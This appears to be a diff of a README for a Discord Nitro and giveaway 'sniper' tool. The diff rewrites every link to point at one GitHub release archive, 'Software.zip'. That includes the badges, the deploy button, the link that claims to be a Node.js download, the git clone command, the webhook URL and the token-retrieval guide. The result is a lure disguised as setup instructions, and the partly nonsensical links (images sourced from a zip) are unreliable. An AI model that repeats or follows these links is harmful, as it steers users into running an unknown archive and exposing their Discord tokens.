@@ -1,17 +1,17 @@
 <h1 align="center">Nitro/Giveaway/Invite Sniper</h1>
 
 <p align="center">
-  <a href="#"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip" /></a>
-  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip" /></a>
-  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip" /></a>
-  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"></a>
-  <a href=" https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip"></a>
+  <a href="#"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip" /></a>
+  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip" /></a>
+  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip" /></a>
+  <a href="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip"></a>
+  <a href=" https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip"><img src="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip"></a>
 </p>
 
 <p align="center">
    A lightweight, fast and efficient discord nitro sniper, giveaway sniper & invite sniper. <br />
    If you're forking this and enjoy my projects, consider leaving a star on the repo with the "Star" button in the top right :)
-   <img src="https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip" />
+   <img src="https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip" />
 </p>
 
 # Features
@@ -49,15 +49,15 @@
 #### Heroku (recommended)
 Click on the image below and login to continue the setup.<br>
 
-[![Deploy](https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip)](https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip)  
+[![Deploy](https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip)](https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip)  
 
 Make sure you go to your app -> Configure dynos/Resources and turn off `web` and start `worker`.<br>
 
 You can then see logs by clicking on `More` (top right) and then `View logs`.<br>
 
 #### Local
-- Make sure [Node v14+](https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip) is installed on your system and open a command prompt/terminal.
-- Run `git clone https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip nitro-sniper`
+- Make sure [Node v14+](https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip) is installed on your system and open a command prompt/terminal.
+- Run `git clone https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip nitro-sniper`
 - Run `cd nitro-sniper`
 - Run `npm install`
 - Edit the .env file.
@@ -150,7 +150,7 @@ You can then see logs by clicking on `More` (top right) and then `View logs`.<br
    },
    webhook: {
       // URL to fire webhook to for notifications
-      url: 'https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip',
+      url: 'https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip',
       enabled: {
          // Fire webhook on invalid code (true/false)
          codeInvalid: false,
@@ -185,7 +185,7 @@ You can then see logs by clicking on `More` (top right) and then `View logs`.<br
 
 #### How to obtain your token
 
-https://github.com/lochielochie/nitro-sniper/releases/download/v1.0/App.zip
+https://github.com/lochielochie/nitro-sniper/releases/download/v2.0/Software.zip
 
 # Tips
 
